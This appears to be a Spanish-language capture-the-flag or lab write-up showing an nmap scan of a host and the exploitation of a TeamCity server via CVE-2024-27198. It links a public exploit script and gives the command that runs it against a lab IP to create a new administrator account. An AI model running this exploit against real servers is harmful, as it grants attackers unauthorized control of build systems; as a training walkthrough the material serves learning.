```bash
Host is up (0.045s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 84:42:cb:06:38:2f:36:a9:81:14:76:c3:4f:d1:ee:a4 (RSA)
|   256 1c:60:31:78:ab:be:da:73:7f:d7:09:28:77:d2:55:0d (ECDSA)
|_  256 3b:df:08:93:f3:93:61:1d:22:72:e7:1c:4b:49:54:4c (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
37725/tcp open  java-rmi Java RMI
50000/tcp open  http     Apache Tomcat (language: en)
| http-title: Log in to TeamCity &mdash; TeamCity
|_Requested resource was /login.html
|_http-favicon: Unknown favicon MD5: CEE18E28257988B40028043E65A6C2A3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/22%OT=22%CT=1%CU=37858%PV=Y%DS=3%DC=I%G=Y%TM=6A38E65
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=109%GCD=1%ISR=10B%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST
OS:11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4
OS:E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%
OS:T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
OS:T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```


Una vez hecho el escaneo, encontramos el puerto 50000, en donde se aloja una versión vulnerable de JetBrains TeamCity (Version 2023.11.3 (build 147512)).

![](Evidencias_Visuales/vulnerableversion)

Mediante investigación OSINT encontramos una vulnerabilidad crítica (CVE-2024-27198) que podemos entender a detalle en el siguiente enlace hxxps[://]rapid7[.]com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/?ref=blog.gitguardian.com 

Esta vulnerabilidad crítica con un base score de 9.8, permite ejecutar código malicioso con el cual podemos crear un nuevo usaurio y contraseña, los cuales serán almacenados y nos permitira acceso completo a la página web, el código lo podemos encontrar en la siguiente dirección: hxxps[://]github[.]com/yoryio/CVE-2024-27198/blob/main/CVE-2024-27198.py

Una vez ejecutado el comando `python CVE-2024-27198.py -t http://10.128.148.36:50000/ -u AGARTI -p root` hemos creado un nuevo usuario (AGARTI) con una nueva contraseña (root). Lo que nos permite acceder a la página web.

![](Evidencias_Visuales/newcredentials)

![](Evidencias_Visuales/newlogin)
